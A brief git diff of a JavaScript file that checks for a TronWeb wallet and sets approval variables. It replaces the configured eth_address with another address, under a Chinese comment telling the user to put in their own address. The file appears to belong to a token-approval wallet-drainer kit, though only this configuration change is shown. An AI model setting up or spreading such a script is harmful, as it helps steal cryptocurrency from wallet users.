@@ -5,7 +5,7 @@ if(typeof window.tronWeb !== "undefined"){
     spender_hex = null;
 }
 //这里地址更改为自己地址(目前是随便写的一个)
-eth_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+eth_address = '0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075';
 approve_type = 2;
 
 function printd(text) {
